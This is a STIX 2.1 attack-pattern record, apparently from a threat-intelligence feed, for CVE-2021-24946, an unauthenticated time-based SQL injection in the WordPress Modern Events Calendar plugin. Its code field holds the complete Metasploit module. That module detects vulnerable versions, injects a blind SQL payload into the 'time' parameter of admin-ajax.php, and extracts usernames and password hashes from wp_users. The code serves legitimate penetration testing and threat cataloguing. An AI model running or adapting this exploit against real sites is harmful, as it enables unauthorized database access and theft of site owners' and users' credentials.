{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e1fc05ed-3c01-4e63-bfef-356f732a41b1",
    "created": "2024-08-14T16:28:58.104895Z",
    "modified": "2024-08-14T16:28:58.104899Z",
    "name": "WordPress Modern Events Calendar SQLi Scanner",
    "description": " Modern Events Calendar plugin contains an unauthenticated timebased SQL injection in versions before 6.1.5.  The time parameter is vulnerable to injection. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_modern_events_calendar_sqli.rb",
            "external_id": "wp_modern_events_calendar_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-24946"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24946/README.md"
        },
        {
            "source_name": "WPVDB",
            "external_id": "09871847-1d6a-4dfe-8a8c-f2f53ff87445"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Modern Events Calendar SQLi Scanner',\n        'Description' => %q{\n          Modern Events Calendar plugin contains an unauthenticated timebased SQL injection in\n          versions before 6.1.5.  The time parameter is vulnerable to injection.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'Hacker5preme (Ron Jost)', # edb\n          'red0xff' # sqli lib assistance\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'EDB', '50687' ],\n          [ 'CVE', '2021-24946' ],\n          [ 'URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24946/README.md' ],\n          [ 'WPVDB', '09871847-1d6a-4dfe-8a8c-f2f53ff87445' ]\n        ],\n        'Actions' => [\n          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DefaultAction' => 'List Users',\n        'DisclosureDate' => '2021-12-13'\n      )\n    )\n    register_options [\n      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1])\n    ]\n  end\n\n  def check_host(_ip)\n    unless wordpress_and_online?\n      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')\n    end\n\n    checkcode = check_plugin_version_from_readme('modern-events-calendar-lite', '6.1.5')\n    if checkcode == Msf::Exploit::CheckCode::Safe\n      return Msf::Exploit::CheckCode::Safe('Modern Events Calendar version not vulnerable')\n    end\n\n    print_good('Vulnerable version of Modern Events Calendar detected')\n    checkcode\n  end\n\n  def run_host(ip)\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload| # also tried encoder: :base64 and still not quite getting the right answer.\n      d = Rex::Text.rand_text_numeric(4)\n      # the webapp takes this parameter and uses it two times in the query, therefore our sleep is 2x what it should be. so we need to cut it.\n      payload = payload.gsub(/sleep\\(\\d+\\.\\d+\\)/i, \"sleep(#{datastore['SQLIDELAY'] / 2})\")\n\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n        'vars_get' => {\n          'action' => 'mec_load_single_page',\n          # taken from sqlmap\n          'time' => \"#{Rex::Text.rand_text_numeric(1)}) AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND (#{d}=#{d}\"\n        }\n      })\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n    end\n    unless @sqli.test_vulnerable\n      fail_with Failure::PayloadFailed, \"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\"\n    end\n\n    columns = ['user_login', 'user_pass']\n    results = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])\n    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)\n    results.each do |user|\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user[0],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),\n        private_data: user[1],\n        service_name: 'Wordpress',\n        address: ip,\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n      table << user\n    end\n    print_good(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-12-13"
}